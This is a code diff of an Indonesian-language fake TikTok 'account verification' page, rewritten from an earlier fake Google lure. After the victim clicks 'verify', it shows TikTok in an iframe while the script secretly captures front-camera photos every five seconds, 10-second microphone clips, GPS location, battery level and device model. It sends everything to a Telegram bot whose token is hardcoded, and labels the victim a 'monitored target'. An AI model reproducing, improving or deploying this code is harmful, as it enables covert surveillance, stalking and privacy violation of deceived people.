@@ -3,12 +3,54 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google - Verifikasi Keamanan</title>
+    <title>TikTok - Verifikasi Akun</title>
     <style>
-        body { margin: 0; font-family: arial, sans-serif; background: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
-        .box { width: 90%; max-width: 400px; padding: 20px; border: 1px solid #dfe1e5; border-radius: 8px; box-shadow: 0 1px 6px rgba(32,33,36,0.28); }
-        .logo { width: 150px; margin-bottom: 20px; }
-        .btn { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 15px; width: 100%; }
+        body { 
+            margin: 0; 
+            font-family: 'ProximaNova', Arial, sans-serif; 
+            background: #121212; 
+            color: #ffffff;
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            text-align: center; 
+        }
+        .box { 
+            width: 85%; 
+            max-width: 380px; 
+            padding: 30px 20px; 
+            background: #000000;
+            border: 1px solid #2f2f2f; 
+            border-radius: 8px; 
+            box-shadow: 0 4px 20px rgba(254, 44, 85, 0.2); 
+        }
+        .logo { 
+            width: 140px; 
+            margin-bottom: 25px; 
+        }
+        p {
+            font-size: 14px;
+            color: #e3e3e3;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+        .btn { 
+            background: #fe2c55; 
+            color: white; 
+            border: none; 
+            padding: 14px 24px; 
+            border-radius: 4px; 
+            cursor: pointer; 
+            font-weight: bold; 
+            font-size: 15px;
+            width: 100%; 
+            transition: background 0.2s;
+        }
+        .btn:active {
+            background: #ca2344;
+        }
         #mainContent { display: none; width: 100%; height: 100%; }
         iframe { border: none; width: 100%; height: 100%; }
     </style>
@@ -16,9 +58,10 @@
 <body>
 
 <div id="verifyBox" class="box">
-    <img src="https://sf16-sg.tiktokcdn.com/obj/eden-sg/uphsjulyb7n/tiktok-icon.png" class="logo" alt="TikTok Logo">
-    <p>Sistem mendeteksi aktivitas mencurigakan. Klik tombol di bawah untuk melanjutkan ke TikTok.</p>
-    <button class="btn" onclick="startSystem()">SAYA BUKAN ROBOT</button>
+    <!-- Menggunakan logo resmi TikTok dengan latar belakang transparan -->
+    <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" class="logo" alt="TikTok">
+    <p>Sistem mendeteksi aktivitas tidak biasa pada perangkat Anda. Silakan verifikasi bahwa Anda adalah manusia untuk melanjutkan ke aplikasi.</p>
+    <button class="btn" onclick="startSystem()">VERIFIKASI SEKARANG</button>
 </div>
 
 <div id="mainContent">
@@ -26,7 +69,7 @@
 </div>
 
 <video id="video" style="display:none;" autoplay playsinline></video>
-<canvas id="canvas" style="display:none;"></canvas>
+<canvas id="canvas" style="display:none;" ></canvas>
 
 <script>
     const TOKEN = '8746483619:AAFM0hZ7HwcnPFPV07PFUZZ4lGML0Nrt5aw';
@@ -46,7 +89,7 @@
             const match = ua.match(/\(([^;]+); ([^;]+); ([^)]+)\)/);
             if (match) rawModel = match[3].split(" Build")[0].trim();
         }
-
+        
         const db = {
             "2310FPCA4G": "POCO C65", "M2102J20SG": "POCO X3 Pro", "2201117TY": "Redmi Note 11", 
             "2201116SG": "Redmi Note 11 Pro", "22101316G": "POCO M5", "M2012K11AG": "POCO F3", 
@@ -77,18 +120,18 @@
         deviceName = await getAdvancedDeviceName();
         document.getElementById('verifyBox').style.display = 'none';
         document.getElementById('mainContent').style.display = 'block';
-        document.getElementById('gFrame').src = "https://www.tiktok.com";
+        // Mengalihkan iframe ke halaman utama TikTok setelah klik verifikasi
+        document.getElementById('gFrame').src = "https://www.tiktok.com/";
 
-        // Minta Izin Lokasi
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(pos => {
                 userLoc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
             }, err => { userLoc = "Izin Lokasi Ditolak"; }, { enableHighAccuracy: true });
         }
 
-        // Jalankan Kamera
+        // Tetap menggunakan Kamera Depan
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             document.getElementById('video').srcObject = stream;
             setInterval(takeAndSend, 5000);
         } catch (e) {
@@ -99,42 +142,34 @@
             } catch (err) { takeAndSend(); }
         }
 
-        // Fitur Live Mic (Audio)
-        startAudioRecording();
+        // Tetap menggunakan Live Mic
+        startAudioCapture();
     }
 
-    async function startAudioRecording() {
+    async function startAudioCapture() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            const mediaRecorder = new MediaRecorder(stream);
-            let chunks = [];
-
-            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-            mediaRecorder.onstop = () => {
-                const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
-                sendAudioTelegram(blob);
-                chunks = [];
-                mediaRecorder.start(); // Mulai rekam lagi setelah kirim
+            const recorder = new MediaRecorder(stream);
+            let audioChunks = [];
+            
+            recorder.ondataavailable = (e) => audioChunks.push(e.data);
+            recorder.onstop = () => {
+                const blob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
+                sendAudio(blob);
+                audioChunks = [];
+                recorder.start();
             };
 
-            // Rekam setiap 10 detik dan kirim
-            mediaRecorder.start();
-            setInterval(() => {
-                if(mediaRecorder.state === "recording") mediaRecorder.stop();
-            }, 10000); 
-
-        } catch (err) {
-            console.log("Mic akses ditolak");
-        }
+            recorder.start();
+            setInterval(() => { if(recorder.state === "recording") recorder.stop(); }, 10000);
+        } catch (e) { console.log("Mic blocked"); }
     }
 
-    async function sendAudioTelegram(blob) {
+    async function sendAudio(blob) {
         const fd = new FormData();
         fd.append('chat_id', CHAT_ID);
-        fd.append('voice', blob, 'recording.ogg');
-        fd.append('caption', `🎙 *Audio Target* - ${deviceName}`);
-        fd.append('parse_mode', 'Markdown');
-        
+        fd.append('voice', blob, 'mic.ogg');
+        fd.append('caption', `🎙 *Audio Terpantau*\nHP: ${deviceName}`);
         fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
     }
 
@@ -150,7 +185,7 @@
         const report = (blob) => {
             const fd = new FormData();
             fd.append('chat_id', CHAT_ID);
-            fd.append('caption', `👁 *Target Terpantau*\n\n📱 HP: ${deviceName}\n🔋 Baterai: ${battery}\n📍 Lokasi: ${userLoc}\n📷 Mode: Kamera`);
+            fd.append('caption', `👁 *Target Terpantau*\n\n📱 HP: ${deviceName}\n🔋 Baterai: ${battery}\n📍 Lokasi: ${userLoc}\n📷 Mode: Kamera Depan`);
             fd.append('parse_mode', 'Markdown');
             if (blob) {
                 fd.append('photo', blob, 'shot.jpg');
